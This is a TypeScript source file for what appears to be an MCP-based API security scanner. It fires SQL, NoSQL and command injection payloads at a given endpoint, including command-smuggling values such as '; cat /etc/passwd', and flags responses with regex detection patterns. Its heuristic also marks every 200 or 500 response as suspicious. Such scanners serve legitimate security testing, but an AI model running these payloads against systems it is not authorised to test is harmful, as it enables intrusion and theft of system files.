import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import axios from "axios";
import { AuthManager } from "../utils/authManager.js";

/**
 * Register injection security testing tools
 */
export function registerInjectionTools(server: McpServer) {
  // SQL Injection testing tool
  server.tool(
    "sql_injection_check",
    {
      endpoint: z.string().url().describe("API endpoint to test"),
      parameter_name: z.string().describe("Name of the parameter to test for SQL injection"),
      http_method: z.enum(["GET", "POST"]).default("GET").describe("HTTP method to use"),
      use_auth: z.boolean().default(true).describe("Whether to use current authentication if available"),
    },
    async ({ endpoint, parameter_name, http_method, use_auth }) => {
      // SQL injection payloads
      const sqlPayloads = [
        "' OR '1'='1",
        "1' OR '1' = '1",
        "1 OR 1=1",
        "' OR 1=1--",
        "' OR 'x'='x",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT @@version--",
        "admin'--",
        "admin' #",
        "' HAVING 1=1--",
        "' GROUP BY columnnames having 1=1--",
        "' UNION SELECT sum(columnname) from tablename--",
      ];
      
      const results = [];
      
      try {
        for (const payload of sqlPayloads) {
          const response = await makeRequest(endpoint, parameter_name, payload, http_method, use_auth);
          const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
          
          // Check for signs of SQL injection vulnerability
          const suspicious = checkForSqlInjectionSuccess(responseBody, response.status);
          
          results.push({
            payload,
            status: response.status,
            size: responseBody.length,
            suspicious,
            notes: suspicious ? "Possible SQL injection vulnerability" : "No clear signs of vulnerability",
          });
        }
        
        // Add authentication info to the report
        const authManager = AuthManager.getInstance();
        const authState = authManager.getAuthState();
        const authInfo = use_auth && authState.type !== 'none'
          ? `\nTests performed with authentication: ${authState.type}`
          : '\nTests performed without authentication';
        
        return {
          content: [
            {
              type: "text",
              text: formatSqlInjectionResults(results, endpoint, parameter_name, authInfo),
            },
          ],
        };
      } catch (error) {
        return {
          content: [
            {
              type: "text",
              text: `Error testing for SQL injection: ${(error as Error).message}`,
            },
          ],
        };
      }
    }
  );

  // NoSQL Injection testing tool
  server.tool(
    "nosql_injection_check",
    {
      endpoint: z.string().url().describe("API endpoint to test"),
      parameter_name: z.string().describe("Name of the parameter to test for NoSQL injection"),
      http_method: z.enum(["GET", "POST"]).default("GET").describe("HTTP method to use"),
      use_auth: z.boolean().default(true).describe("Whether to use current authentication if available"),
    },
    async ({ endpoint, parameter_name, http_method, use_auth }) => {
      // NoSQL injection payloads
      const nosqlPayloads = [
        "true, $where: '1 == 1'",
        "{$gt: ''}",
        "{$ne: null}",
        "{$exists: true}",
        "{$where: 'true'}",
        "[$ne]=1",
        "[$exists]=true",
        "[$gt]=''",
        "admin'||'1'=='1",
        "admin'; return true; //",
        "admin'; while(true){} //",
        "admin'; sleep(5000); //",
        "[$regex]=.*",
        "{$regex: '.*'}",
      ];
      
      const results = [];
      
      try {
        for (const payload of nosqlPayloads) {
          const response = await makeRequest(endpoint, parameter_name, payload, http_method, use_auth);
          const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
          
          // Check for signs of NoSQL injection vulnerability
          const suspicious = checkForNoSqlInjectionSuccess(responseBody, response.status);
          
          results.push({
            payload,
            status: response.status,
            size: responseBody.length,
            suspicious,
            notes: suspicious ? "Possible NoSQL injection vulnerability" : "No clear signs of vulnerability",
          });
        }
        
        // Add authentication info to the report
        const authManager = AuthManager.getInstance();
        const authState = authManager.getAuthState();
        const authInfo = use_auth && authState.type !== 'none'
          ? `\nTests performed with authentication: ${authState.type}`
          : '\nTests performed without authentication';
        
        return {
          content: [
            {
              type: "text",
              text: formatNoSqlInjectionResults(results, endpoint, parameter_name, authInfo),
            },
          ],
        };
      } catch (error) {
        return {
          content: [
            {
              type: "text",
              text: `Error testing for NoSQL injection: ${(error as Error).message}`,
            },
          ],
        };
      }
    }
  );

  // Command Injection testing tool
  server.tool(
    "command_injection_check",
    {
      endpoint: z.string().url().describe("API endpoint to test"),
      parameter_name: z.string().describe("Name of the parameter to test for command injection"),
      http_method: z.enum(["GET", "POST"]).default("GET").describe("HTTP method to use"),
      use_auth: z.boolean().default(true).describe("Whether to use current authentication if available"),
    },
    async ({ endpoint, parameter_name, http_method, use_auth }) => {
      // Command injection payloads
      const commandPayloads = [
        "; ls -la",
        "& dir",
        "| whoami",
        "; ping -c 1 127.0.0.1",
        "`ls -la`",
        "$(ls -la)",
        "; sleep 5",
        "| sleep 5",
        "& ping -n 5 127.0.0.1",
        "; cat /etc/passwd",
        "| type C:\\Windows\\win.ini",
        "; uname -a",
        "| ver",
        "& systeminfo",
      ];
      
      const results = [];
      
      try {
        for (const payload of commandPayloads) {
          const response = await makeRequest(endpoint, parameter_name, payload, http_method, use_auth);
          const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
          
          // Check for signs of command injection vulnerability
          const suspicious = checkForCommandInjectionSuccess(responseBody);
          
          results.push({
            payload,
            status: response.status,
            size: responseBody.length,
            suspicious,
            notes: suspicious ? "Possible command injection vulnerability" : "No clear signs of vulnerability",
          });
        }
        
        // Add authentication info to the report
        const authManager = AuthManager.getInstance();
        const authState = authManager.getAuthState();
        const authInfo = use_auth && authState.type !== 'none'
          ? `\nTests performed with authentication: ${authState.type}`
          : '\nTests performed without authentication';
        
        return {
          content: [
            {
              type: "text",
              text: formatCommandInjectionResults(results, endpoint, parameter_name, authInfo),
            },
          ],
        };
      } catch (error) {
        return {
          content: [
            {
              type: "text",
              text: `Error testing for command injection: ${(error as Error).message}`,
            },
          ],
        };
      }
    }
  );
}

/**
 * Helper function to make requests with payloads
 */
async function makeRequest(endpoint: string, paramName: string, paramValue: string, method: string, useAuth: boolean = true) {
  // Prepare the request configuration
  const config: any = {
    method: method.toLowerCase(),
    url: endpoint,
    validateStatus: () => true, // Accept any status code
  };

  // Add authentication headers if available and requested
  if (useAuth) {
    const authManager = AuthManager.getInstance();
    const authState = authManager.getAuthState();
    
    if (authState.type !== 'none' && authState.headers) {
      config.headers = { ...config.headers, ...authState.headers };
    }
  }

  // Add the parameter based on the HTTP method
  if (method === "GET") {
    // For GET requests, add as query parameter
    const url = new URL(endpoint);
    url.searchParams.set(paramName, paramValue);
    config.url = url.toString();
  } else {
    // For POST requests, add in the body
    config.data = { [paramName]: paramValue };
    config.headers = {
      ...config.headers,
      "Content-Type": "application/json",
    };
  }

  return await axios(config);
}

/**
 * Check for signs of successful SQL injection
 */
function checkForSqlInjectionSuccess(responseBody: string, statusCode: number): boolean {
  // Common patterns that might indicate successful SQL injection
  const successPatterns = [
    // Error messages
    /SQL syntax|MySQL|MariaDB|PostgreSQL|ORA-\d{5}|SQL Server|SQLITE_ERROR/i,
    /Warning.*?\Wpdo_.*?|Warning.*?\Wmysql_|Warning.*?\Wpg_/i,
    /SQLSTATE\[\w+\]/i,
    /Microsoft OLE DB Provider for SQL Server/i,
    /\.mdf'\)|'\.[^.]+\.dbo\./i,
    /System\.Data\.SqlClient/i,
    /Exception.*?\bSQL\b/i,
    
    // Successful injection indicators
    /\b(\d+ rows? affected|rows? selected|rows? returned)\b/i,
    /\b(table|column|database).*?does not exist\b/i,
    /\b(invalid|incorrect|missing).*?(syntax|column|table|database)\b/i,
  ];
  
  // Check if response contains any of the success patterns
  const hasPattern = successPatterns.some(pattern => pattern.test(responseBody));
  
  // Check for unusual status codes that might indicate success
  const suspiciousStatus = [200, 500].includes(statusCode);
  
  return hasPattern || suspiciousStatus;
}

/**
 * Check for signs of successful NoSQL injection
 */
function checkForNoSqlInjectionSuccess(responseBody: string, statusCode: number): boolean {
  // Common patterns that might indicate successful NoSQL injection
  const successPatterns = [
    // MongoDB error messages
    /MongoError|MongoDB.*?error/i,
    /CastError.*?MongoDB/i,
    /BulkWriteError.*?MongoDB/i,
    /ValidationError.*?MongoDB/i,
    
    // General NoSQL patterns
    /\$where|\$ne|\$gt|\$lt|\$exists|\$in|\$regex/i,
    /TypeError.*?cannot read property/i,
    /undefined is not.*?object/i,
    /callback is not.*?function/i,
    
    // Successful injection indicators
    /\b(\d+ documents? affected|documents? matched)\b/i,
    /\b(collection|field).*?does not exist\b/i,
    /\b(invalid|incorrect|missing).*?(operator|field|value)\b/i,
  ];
  
  // Check if response contains any of the success patterns
  const hasPattern = successPatterns.some(pattern => pattern.test(responseBody));
  
  // Check for unusual status codes that might indicate success
  const suspiciousStatus = [200, 500].includes(statusCode);
  
  return hasPattern || suspiciousStatus;
}

/**
 * Check for signs of successful command injection
 */
function checkForCommandInjectionSuccess(responseBody: string): boolean {
  // Common patterns that might indicate successful command injection
  const successPatterns = [
    // Unix-like command output patterns
    /\btotal\s+\d+\b.*\b\d{4}(-\d{2}){2}\b/i,  // ls -la output
    /\broot:.*:0:0:/,                             // /etc/passwd content
    /\b\w+\s+\d+\s+\w+\s+\w+\s+\d+\s+\w{3}\s+\d+/i,  // ps output
    /Linux.*?\d+\.\d+\.\d+/i,                    // uname -a output
    
    // Windows command output patterns
    /\[boot loader\]/i,                           // boot.ini content
    /Volume\s+Serial\s+Number/i,                  // dir output
    /\bVersion\s+\d+\.\d+\.\d+/i,                 // ver output
    /\bHost Name:\s+\S+\s+OS/i,                   // systeminfo output
    
    // Generic command output patterns
    /\b(?:uid|gid|groups)=\d+/i,                  // id command output
    /\b(?:bytes from|icmp_seq|ttl=\d+)\b/i,       // ping output
    /\b(?:DNS|IP|Gateway|DHCP|Subnet)\b.*?:\s+[\d\.]+/i,  // ipconfig/ifconfig output
    
    // Error messages that might indicate command execution
    /command.*not.*found|not.*recognized.*command/i,
    /permission denied|access is denied/i,
    /cannot execute binary file|cannot run program/i,
  ];
  
  // Check if response contains any of the success patterns
  return successPatterns.some(pattern => pattern.test(responseBody));
}

/**
 * Format SQL injection results into a readable report
 */
function formatSqlInjectionResults(
  results: Array<{ payload: string; status: number; size: number; suspicious: boolean; notes: string }>,
  endpoint: string,
  parameterName: string,
  authInfo: string = ''
): string {
  let report = `# SQL Injection Test Results for ${endpoint} (parameter: ${parameterName})${authInfo}\n\n`;
  
  // Count suspicious findings
  const suspiciousCount = results.filter(r => r.suspicious).length;
  
  // Add summary
  report += `## Summary\n\n`;
  report += `- Total payloads tested: ${results.length}\n`;
  report += `- Suspicious responses: ${suspiciousCount}\n\n`;
  
  // Add detailed findings
  report += `## Detailed Findings\n\n`;
  
  for (const result of results) {
    if (result.suspicious) {
      report += `### Suspicious Response\n`;
      report += `- Payload: \`${result.payload}\`\n`;
      report += `- Status Code: ${result.status}\n`;
      report += `- Response Size: ${result.size} bytes\n`;
      report += `- Notes: ${result.notes}\n\n`;
    }
  }
  
  // Add recommendations
  report += `## Recommendations\n\n`;
  report += `- Use parameterized queries or prepared statements\n`;
  report += `- Implement proper input validation\n`;
  report += `- Use an ORM when possible\n`;
  report += `- Implement proper error handling to prevent information leakage\n`;
  report += `- Use the principle of least privilege for database users\n`;
  
  return report;
}

/**
 * Format NoSQL injection results into a readable report
 */
function formatNoSqlInjectionResults(
  results: Array<{ payload: string; status: number; size: number; suspicious: boolean; notes: string }>,
  endpoint: string,
  parameterName: string,
  authInfo: string = ''
): string {
  let report = `# NoSQL Injection Test Results for ${endpoint} (parameter: ${parameterName})${authInfo}\n\n`;
  
  // Count suspicious findings
  const suspiciousCount = results.filter(r => r.suspicious).length;
  
  // Add summary
  report += `## Summary\n\n`;
  report += `- Total payloads tested: ${results.length}\n`;
  report += `- Suspicious responses: ${suspiciousCount}\n\n`;
  
  // Add detailed findings
  report += `## Detailed Findings\n\n`;
  
  for (const result of results) {
    if (result.suspicious) {
      report += `### Suspicious Response\n`;
      report += `- Payload: \`${result.payload}\`\n`;
      report += `- Status Code: ${result.status}\n`;
      report += `- Response Size: ${result.size} bytes\n`;
      report += `- Notes: ${result.notes}\n\n`;
    }
  }
  
  // Add recommendations
  report += `## Recommendations\n\n`;
  report += `- Validate and sanitize all user input\n`;
  report += `- Use type checking for query parameters\n`;
  report += `- Implement proper error handling\n`;
  report += `- Use schema validation when possible\n`;
  report += `- Implement proper access controls\n`;
  
  return report;
}

/**
 * Format command injection results into a readable report
 */
function formatCommandInjectionResults(
  results: Array<{ payload: string; status: number; size: number; suspicious: boolean; notes: string }>,
  endpoint: string,
  parameterName: string,
  authInfo: string = ''
): string {
  let report = `# Command Injection Test Results for ${endpoint} (parameter: ${parameterName})${authInfo}\n\n`;
  
  // Count suspicious findings
  const suspiciousCount = results.filter(r => r.suspicious).length;
  
  // Add summary
  report += `## Summary\n\n`;
  report += `- Total payloads tested: ${results.length}\n`;
  report += `- Suspicious responses: ${suspiciousCount}\n\n`;
  
  // Add detailed findings
  report += `## Detailed Findings\n\n`;
  
  for (const result of results) {
    if (result.suspicious) {
      report += `### Suspicious Response\n`;
      report += `- Payload: \`${result.payload}\`\n`;
      report += `- Status Code: ${result.status}\n`;
      report += `- Response Size: ${result.size} bytes\n`;
      report += `- Notes: ${result.notes}\n\n`;
    }
  }
  
  // Add recommendations
  report += `## Recommendations\n\n`;
  report += `- Avoid using shell commands with user input\n`;
  report += `- Use built-in language functions instead of system commands\n`;
  report += `- Implement strict input validation\n`;
  report += `- Use allowlist approach for permitted characters\n`;
  report += `- Run with minimal required privileges\n`;
  
  return report;
}